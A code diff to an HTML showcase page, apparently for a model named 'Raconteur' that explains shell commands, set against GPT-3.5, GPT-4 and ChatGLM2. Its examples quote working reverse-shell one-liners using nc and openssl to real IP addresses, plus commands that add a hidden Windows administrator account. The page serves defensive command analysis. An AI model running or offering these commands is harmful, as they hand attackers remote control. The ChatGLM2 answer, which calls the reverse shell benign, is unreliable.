@@ -1990,6 +1990,8 @@
       font-size: .875em;
       font-weight: 400;
       padding: .25em .5em .25em;
+      line-height: 1.5; /* 增加行高，确保两行之间有足够的间距 */
+      white-space: pre-wrap; /* 确保长代码行自动换行 */
     }
 
     body {
@@ -2032,8 +2034,10 @@
       display: block;
       color: white;
       text-align: center;
-      padding: 14px 20px;
+      padding: 20px 10px;
       text-decoration: none;
+      font-size: 20px; /* 调整字体大小 */
+      line-height: 0rem; /* 确保行高适应字体大小 */
     }
 
     .navbar a:hover {
@@ -2065,7 +2069,7 @@
       border-left: 5px solid #f1c432;
       padding: 15px;
       box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-      border-radius: 15px;
+      border-radius: 0px;
       /* 圆角 */
     }
 
@@ -2075,7 +2079,7 @@
       overflow: hidden;
       background-color: #fff;
       box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-      border-radius: 15px;
+      border-radius: 0%;
       /* 圆角 */
       padding: 20px;
     }
@@ -2411,27 +2415,165 @@
           <div class="slider-container">
             <div class="slider-item" data-slider-index="0">
               <div class="llm_question">
-                <p>问题1：什么意思呀以下代码？cat loot_zsh.txt</p>
+                <h3>What does the shell command mean?</h3>
+                <code>mkfifo /tmp/oidj; nc 76.151.217.63 8796 0&lt;/tmp/oidj | /bin/sh &gt;/tmp/oidj 2&gt;&amp;1; rm /tmp/oidj</code>
+                
               </div>
               <div class="llm_answers">
                 <div class="llm_answer" style="border-right: 2px solid gray;">
-                  <p><strong>回答A:</strong><br>该命令的总体意图是将文件"loot_zsh.txt"的内容输出到标准输出。</p>
+                  <h4><strong>Raconteur:</strong></h4>
+                  <p style="text-align: left;">
+                    1. <code>mkfifo /tmp/oidj</code>: Creates a named pipe, named <code>/tmp/oidj</code>.<br><br>
+                    2. <code>nc 76.151.217.63 8796 0&lt;/tmp/oidj</code>: Uses the nc (netcat) command to connect to a host at IP address <code>76.151.217.63</code>, port <code>8796</code>, and sends the contents of <code>/tmp/oidj</code> to that host.<br>
+                    3. <code>| /bin/sh >/tmp/oidj 2>&1</code>: Pipes the output of the nc command to <code>/bin/sh</code>, allowing the remote host to execute commands on the local machine. The output is redirected to the <code>/tmp/oidj</code> file.<br>
+                    4. <code>rm /tmp/oidj</code>: Deletes the named pipe <code>/tmp/oidj</code>.<br><br>
+                    This command is potentially malicious, representing a reverse shell attack. The attacker uses the named pipe /tmp/oidj to send shell commands from the local host to the remote host, effectively gaining control of the remote system.<br><br>
+
+                    It is strongly advised to immediately stop the execution of this command and investigate the system for any abnormal processes or network connections. Additional security measures should be taken, such as restricting external network access, applying system patches, and strengthening password policies.
+                  </p>
                 </div>
                 <div class="llm_answer">
-                  <p><strong>回答B:</strong><br>这个命令表示将名为"loot_zsh.txt"的文件的内容输出到终端上。</p>
+                  <h4><strong>GPT-3.5:</strong></h4>
+                  <p style="text-align: left;">This command outputs the contents of the file named "loot_zsh.txt" to the terminal.</p>
                 </div>
               </div>
             </div>
             <div class="slider-item" data-slider-index="1">
               <div class="llm_question">
-                <h3>问题2：这个是什么东西？</h3>
+                <h3>什么意思呀以下代码？</h3>
+                <code>cat loot_zsh.txt</code>
               </div>
               <div class="llm_answers">
                 <div class="llm_answer" style="border-right: 2px solid gray;">
-                  <p><strong>回答A:</strong><br>这是另一个响应的示例。</p>
+                  <h4><strong>Raconteur:</strong></h4>
+                  <p style="text-align: left;">
+                    该命令的总体意图是将文件<code>loot_zsh.txt</code>的内容输出到标准输出。<br>
+                    <br>
+                    步骤和参数的含义如下：<br>
+                    1. <code>cat</code>：这是一个用于连接文件并将其打印到标准输出的命令。<br>
+                    2. <code>loot_zsh.txt</code>：这是要连接和输出的文件名。<br>
+                    <br>
+                    根据命令文档的描述，该命令的目的是打印文件<code>loot_zsh.txt</code>的内容。
+                  </p>
                 </div>
                 <div class="llm_answer">
-                  <p><strong>回答B:</strong><br>这是我们对另一个响应的解释。</p>
+                  <h4><strong>GPT-3.5:</strong></h4>
+                  <p style="text-align: left;">这个命令表示将名为<code>loot_zsh.txt</code>的文件的内容输出到终端上。</p>
+                </div>
+              </div>
+            </div>
+
+
+            <div class="slider-item" data-slider-index="2">
+              <div class="llm_question">
+                <h3>帮我说明一下以下代码</h3>
+                <code> net user /add "T1136.001_Admin" "T1136_pass"</code><br>
+                <code> net localgroup administrators "T1136.001_Admin" /add </code>
+              </div>
+              <div class="llm_answers">
+                <div class="llm_answer" style="border-right: 2px solid gray;">
+                  <h4><strong>Raconteur:</strong></h4>
+                  <p style="text-align: left;">
+                    该命令是用于在Windows系统中创建一个新用户的命令。具体步骤如下：<br><br>
+                    1. 使用<code>net user</code>命令创建一个新用户，其中<code>/add</code>参数表示添加新用户，<code>T1136.001_Admin</code>是用户名，<code>T1136_pass</code>是用户密码。<br><br>
+                    2. 使用<code>net localgroup</code>命令将新用户添加到本地管理员组中，其中<code>/add</code>参数表示添加新用户，<code>T1136.001_Admin</code>是用户名，表示要添加到的组名。<br><br>
+                    该命令属于恶意代码，属于权限提升类恶意代码。该命令可以创建一个新用户并将其添加到本地管理员组中，从而获得管理员权限，从而可以执行系统管理员权限的命令。建议对该命令进行审查和阻止，以防止恶意攻击。
+                  </p>
+                </div>
+                <div class="llm_answer">
+                  <h4><strong>GPT-4:</strong></h4>
+                  <p style="text-align: left;">
+                    以上代码主要用于Windows环境，用于创建新的用户并将该用户添加到管理员组。<br><br>
+                    第一行命令<code>net user /add ""T1136.001_Admin"" ""T1136_pass""</code>用于创建一个新的用户。其中，""T1136.001_Admin""是新创建的用户名，""T1136_pass""是该用户的密码。<br><br>
+                    第二行命令<code>net localgroup administrators ""T1136.001_Admin"" /add</code>是将新创建的用户""T1136.001_Admin""添加到本地的管理员组中，赋予管理员权限。<br><br>
+                    综上，这段代码创建了一个叫做""T1136.001_Admin""的用户并给与其管理员权限。
+                  </p>
+                </div>
+              </div>
+            </div>
+            <div class="slider-item" data-slider-index="3">
+              <div class="llm_question">
+                <h3>What does this command mean?</h3>
+                <code>cat loot_zsh.txt</code>
+              </div>
+              <div class="llm_answers">
+                <div class="llm_answer" style="border-right: 2px solid gray;">
+                  <h4><strong>Raconteur:</strong></h4>
+                  <p style="text-align: left;">
+                    The overall intent of the command <code>cat loot_zsh.txt</code> is to output the contents of the file <code>loot_zsh.txt</code> to the standard output.<br><br>
+                    The steps and parameters are explained as follows:<br><br>
+                    <code>cat</code>: This is a command used for concatenating files and printing them to the standard output.<br><br>
+                    <code>loot_zsh.txt</code>: This is the filename of the file to be concatenated and printed.<br><br>
+                    According to the command documentation, the purpose of this command is to print the contents of the file <code>loot_zsh.txt</code>.
+                  </p>
+                </div>
+                <div class="llm_answer">
+                  <h4><strong>GPT-4:</strong></h4>
+                  <p style="text-align: left;">
+                    The command <code>cat loot_zsh.txt</code> is used in a Unix-like operating system's shell to display the contents of a file named loot_zsh.txt. The cat command stands for "concatenate," and it reads files sequentially, writing them to the standard output. In this context, if you run this command in a terminal, it will show you everything inside the <code>loot_zsh.txt</code> file.<br>
+                  </p>
+                </div>
+              </div>
+            </div>
+            <div class="slider-item" data-slider-index="4">
+              <div class="llm_question">
+                <h3>解释代码:</h3>
+                <code>sh -c '(sleep 4377|openssl s_client -quiet -connect 81.30.139.69:8429|while : ; do sh && break; done 2>&1|openssl s_client -quiet -connect 81.30.139.69:8429 >/dev/null 2>&1 &)'</code>
+              </div>
+              <div class="llm_answers">
+                <div class="llm_answer" style="border-right: 2px solid gray;">
+                  <h4><strong>Raconteur:</strong></h4>
+                  <p style="text-align: left;">
+                    该命令的总体意图是在目标机器上建立一个反向shell连接，以便攻击者可以远程控制该机器。<br><br>
+                    具体步骤和参数含义如下：<br><br>
+
+                    1. <code>sh -c</code>：使用sh命令执行后面的命令。<br><br>
+
+                    2. <code>(sleep 4377|openssl s_client -quiet -connect 81.30.139.69:8429|while : ; do sh && break; done 2>&1|openssl s_client -quiet -connect 81.30.139.69:8429 >/dev/null 2>&1 &)</code>
+                    该命令包含多个子命令，用括号括起来表示作为一个整体执行。<br><br>
+
+                    2.1. <code>sleep 4377</code>：等待4377秒，以便攻击者有足够的时间建立反向shell连接。<br><br>
+
+                    2.2. <code>openssl s_client -quiet -connect 81.30.139.69:8429</code>：使用<code>openssl</code>命令连接到<code>81.30.139.69</code>的<code>8429</code>端口，以便与攻击者建立反向shell连接。<br><br>
+
+                    2.3. <code>while : ; do sh && break; done</code>：在反向shell连接建立之前，不断尝试执行sh命令，以便攻击者可以远程控制该机器。<br><br>
+
+                    2.4. <code>2>&1</code>：将标准错误输出重定向到标准输出，以便在反向shell连接建立后能够看到错误信息。<br><br>
+
+                    2.5. <code>openssl s_client -quiet -connect 81.30.139.69:8429 >/dev/null 2>&1 &</code>：在反向shell连接建立后，使用<code>openssl</code>命令连接到<code>81.30.139.69</code>的<code>8429</code>端口，并将标准输出重定向到<code>/dev/null</code>，以便在后台运行该命令。<br><br>
+
+                    该命令是潜在的恶意代码，因为它试图在目标机器上建立一个反向shell连接，以便攻击者可以远程控制该机器。建议立即停止该命令的执行，并检查该机器是否已经被入侵。如果已经被入侵，应立即采取措施清除恶意代码，并加强安全防护措施，以避免类似攻击再次发生。<br><br>
+                  </p>
+                </div>
+                <div class="llm_answer">
+                  <h4><strong>ChatGLM2:</strong></h4>
+                  <p style="text-align: left;">
+                    该命令的作用是使用"sleep"命令让计算机暂停执行4377秒（即4377*1000=4377000），然后使用"openssl s_client"命令连接到远程服务器81.30.139.69的8429端口，并保持静默连接。在连接成功后，命令会暂停执行一段时间（即2秒钟），然后再次连接并输出到/dev/null，即输出为空字符串。<br><br>
+                    综合来看，该命令的主要作用是让计算机暂停一段时间，然后远程连接并输出连接信息，可能是用于一些安全测试或审计等用途。 <br><br>
+                  </p>
+                </div>
+              </div>
+            </div>
+            <div class="slider-item" data-slider-index="5">
+              <div class="llm_question">
+                <h3>What does this code mean?</h3>
+                <code>od -tx2 FILENAME</code>
+              </div>
+              <div class="llm_answers">
+                <div class="llm_answer" style="border-right: 2px solid gray;">
+                  <h4><strong>Raconteur:</strong></h4>
+                  <p style="text-align: left;">
+                    1. <code>od</code> is a Linux/Unix command used to convert files into different formats, including octal, hexadecimal, decimal, etc.<br>
+                    2. <code>-tx2</code> is a parameter for the od command, where <code>-t</code> specifies the output format and <code>x2</code> indicates that the output should be in 2-byte hexadecimal data.<br>
+                    3. <code>FILENAME</code> is the filename of the file to be dumped.<br><br>
+                    The overall intent of the command is to dump the file in 2-byte hexadecimal units, making it easier to view the contents of the file.
+                  </p>
+                </div>
+                <div class="llm_answer">
+                  <h4><strong>GPT-3.5:</strong></h4>
+                  <p style="text-align: left;">
+                    <code>od -tx2 FILENAME</code> is a command-line tool used to output files in octal or textual formats. The <code>-tx2</code> option indicates that the file should be output in hexadecimal format, and <code>FILENAME</code> is the name of the file to be output. Thus, the command means to output the specified file <code>FILENAME</code> in hexadecimal format.
+                  </p>
                 </div>
               </div>
             </div>
@@ -2453,6 +2595,7 @@
           <div class="slider-page" data-index="2"></div>
           <div class="slider-page" data-index="3"></div>
           <div class="slider-page" data-index="4"></div>
+          <div class="slider-page" data-index="5"></div>
         </div>
       </div>
     </div>
